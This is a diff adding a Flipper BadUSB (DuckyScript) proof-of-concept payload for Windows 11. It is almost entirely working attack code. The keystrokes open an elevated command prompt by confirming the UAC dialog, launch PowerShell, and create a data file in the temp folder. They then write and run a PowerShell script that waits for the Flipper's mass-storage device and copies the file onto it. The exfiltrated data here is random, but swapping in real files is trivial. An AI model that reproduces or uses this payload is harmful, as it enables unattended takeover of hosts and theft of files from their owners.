@@ -1,0 +1,80 @@
+REM Data Exfiltration Win11 PoC
+
+REM ESC just in case
+ESC
+
+DEFAULT_STRING_DELAY 10
+
+REM Open as Administrator
+GUI 
+DELAY 500
+STRING cmd
+DELAY 700
+CONTROL SHIFT ENTER
+DELAY 750
+LEFT
+DELAY 500
+ENTER
+DELAY 750
+GUI LEFT
+
+REM start PowerShell
+STRING PowerShell
+ENTER
+DELAY 200
+
+REM go to a temporal folder
+STRINGLN cd $env:TEMP
+DELAY 200
+
+REM REM Write some random data to a file
+STRING ([Convert]::ToBase64String((1..32 | % {Get-Random -Max 256}))).Substring(0,20) > my_data.txt
+ENTER
+
+REM =================== Exfiltration PoC ===================
+
+REM Command to tell Flipper that will be exfiltration
+REM Could be place at the begining of the file (after the ID if is there)
+STORAGE
+
+REM Create a PowerShell script to do the exfiltration
+STRINGLN @'
+STRINGLN $targetFriendlyName = "Flipper Mass Storage"
+STRINGLN $sourceFile = "my_data.txt"
+STRINGLN Write-Host "Waiting for MASSSTORAGE..."
+STRINGLN while ($true) {
+STRINGLN $usbDrive = Get-CimInstance Win32_DiskDrive | Where-Object {
+STRINGLN $_.InterfaceType -eq "USB" -and $_.Model -like "*$targetFriendlyName*"
+STRINGLN }
+STRINGLN if ($usbDrive) {
+STRINGLN     # Get drive letter
+STRINGLN     $partitions = Get-CimAssociatedInstance -InputObject $usbDrive -Association Win32_DiskDriveToDiskPartition
+STRINGLN     $logicalDisks = foreach ($p in $partitions) {
+STRINGLN         Get-CimAssociatedInstance -InputObject $p -Association Win32_LogicalDiskToPartition
+STRINGLN     }
+STRINGLN     $driveLetter = $logicalDisks.DeviceID
+STRINGLN     if ($driveLetter -and (Test-Path "$driveLetter\")) {
+STRINGLN         Write-Host "USB detected at $driveLetter"
+STRINGLN         # Copy file
+STRINGLN         Copy-Item -Path $sourceFile -Destination "$driveLetter\" -Force
+STRINGLN         Write-Host "File copied successfully"
+STRINGLN         break
+STRINGLN     }
+STRINGLN }
+STRINGLN Start-Sleep -Seconds 3
+STRINGLN }
+STRINGLN '@ | Set-Content "exfiltration.ps1" -Encoding UTF8 -Force
+DELAY 500
+
+REM Execute the pwscript
+STRINGLN .\exfiltration.ps1
+
+REM ======================================================
+
+REM for demo purposes 
+STRINGLN cat my_data.txt
+ENTER
+
+STRINGLN Start-Process explorer
+DELAY 800
+GUI RIGHT
